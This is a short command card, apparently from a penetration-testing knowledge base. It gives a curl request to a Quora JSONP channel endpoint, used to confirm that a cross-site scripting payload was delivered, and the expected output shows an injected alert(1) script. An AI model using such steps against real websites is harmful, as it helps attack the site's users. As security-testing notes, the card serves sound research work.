---
data: >-
  curl
  'https://tch969298.tch.quora.com/up/chan42-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3501-3261853912009855464&hash=2287....'
tags:
  - xss
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:44.580Z'
id: fbb17cae-eb2c-4e3e-a502-56fcecda1ecc
verified: false
validated: true
submitted: true
---
# curl-quora-channel-update

## Command

```bash
curl 'https://tch969298.tch.quora.com/up/chan42-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3501-3261853912009855464&hash=2287....'
```

## Description

Fetches updates from a Quora channel via JSONP to verify XSS payload delivery and execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| channel | Full channel name | Yes |
| callback | JSONP callback name | Yes |
| hash | Channel hash | Yes |

## Examples

### Basic Usage

```bash
curl 'https://tch969298.tch.quora.com/up/chan42-8888/updates?&callback=jsonpcallback&channel=main-w-dep3501-3261853912009855464&hash=2287....'
```

## Expected Output

jsonp<callback>({"messages":["require.whenReady("main", function() {require('actions').finishAction('',alert(1),'')" ],"min_seq":...})

## Related

- [[procedures/Send-Exploit-Request-and-Verify-Execution]]
